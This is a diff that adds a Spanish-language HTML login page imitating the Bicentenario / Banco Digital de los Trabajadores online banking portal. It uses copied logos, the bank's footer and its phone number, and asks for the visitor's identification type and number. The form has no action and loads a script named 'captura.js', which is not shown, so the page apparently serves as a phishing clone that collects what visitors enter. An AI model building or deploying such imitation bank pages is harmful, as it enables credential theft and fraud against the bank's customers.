@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Bicentenario</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" type="text/css" media="screen" href="./docs/theme_2.css">
+    <link rel="shortcut icon" href="./docs/BBD-FAVICON-256x256.png" type="image/x-icon">
+    <link rel="stylesheet" href="./docs/pe-icon-7-stroke.css">
+    <link rel="stylesheet" href="./docs/loginStyle.css">
+
+    <style>
+        body.stop-scrolling {
+            height: auto !important;
+            overflow: visible !important;
+        }
+        .icon-watch {
+            color: #2c399f !important;
+        }
+        .show-account {
+            user-select: none;
+        }
+        .cargando {
+            display: none;
+            text-align: center;
+            padding: 15px;
+        }
+    </style>
+</head>
+<body class="smart-style-3 fixed-page-footer fixed-header">
+
+<div id="main" role="main" class="mainRegister">
+    <div id="content" class="container" style="opacity: 1;">
+        <form id="login-form">
+            <div class="modal-dialog demo-modal">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h4 class="modal-title text-center mt-1">
+                            <img src="./docs/Logos-BBP-001.png" alt="" style="width: 80%;">
+                        </h4>
+                    </div>
+
+                    <div class="modal-body smart-form client-form">
+                        <div class="row">
+                            <section class="col col-2"></section>
+                            <section class="col col-8">
+                                <label class="label"><strong>Tipo de Identificación</strong></label>
+                                <label class="select radius-5">
+                                    <select class="form-control input-login" name="tipodocben" id="tipodocben">
+                                        <option value="Venezolano">Venezolano</option>
+                                        <option value="Pasaporte">Pasaporte</option>
+                                        <option value="Jurídico">Jurídico</option>
+                                        <option value="Extranjero">Extranjero</option>
+                                        <option value="Gubernamental">Gubernamental</option>
+                                        <option value="Comunal">Comunal</option>
+                                        <option value="Firma Personal">Firma Personal</option>
+                                    </select>
+                                    <i></i>
+                                </label>
+                            </section>
+                        </div>
+
+                        <div class="row">
+                            <section class="col col-2"></section>
+                            <section class="col col-8">
+                                <label class="label"><strong>Número de Identificación</strong></label>
+                                <label class="input show-account">
+                                    <i class="icon-watch icon-append fa fa-eye-slash"></i>
+                                    <input type="password" class="form-control input-login" maxlength="10" name="documento" id="documento" required placeholder="Número de documento">
+                                </label>
+                            </section>
+                        </div>
+
+                        <div class="cargando text-center">
+                            <img src="./docs/BBD-FAVICON-150x150.png" alt="" height="35"> Cargando, Por favor espere un momento...
+                        </div>
+
+                        <div class="botones">
+                            <div class="row mt-1">
+                                <section class="col col-2"></section>
+                                <section class="col col-8">
+                                    <button type="submit" class="btn bg-color-azul btn-block btn-azul-ingreso" id="cmdLogin">Ingresar</button>
+                                </section>
+                            </div>
+
+                            <div class="row mt-1">
+                                <section class="col col-1"></section>
+                                <section class="col col-5 text-center">
+                                    <a href="#" class="btn-link-blue">Registro</a>
+                                </section>
+                                <section class="col col-5 text-center">
+                                    <a href="#" class="btn-link-blue">Desbloqueo de usuario</a>
+                                </section>
+                            </div>
+
+                            <div class="row">
+                                <div class="col-md-3"></div>
+                                <div class="col-md-6 text-center">
+                                    <a href="#" class="btn-link-blue">Olvido usuario master</a>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="clearfix"></div>
+                        <p class="text-center mt-1">
+                            <strong class="note">
+                                Para mayor información o asesoría contáctanos al <br>
+                                Centro de atención telefónica<br>
+                                0500-6272421
+                            </strong>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div class="page-footer text-start" id="footer">
+    <div class="m-3" style="padding-left: 10%;">
+        <strong class="txt-color-white">
+            Banco Digital de los Trabajadores - RIF: G-20009148-7
+            <span class="hidden-xs"> Copyright © 2025.</span> Todos los derechos reservados.
+        </strong>
+    </div>
+</div>
+
+<script src="captura.js"></script>
+
+</body>
+</html>
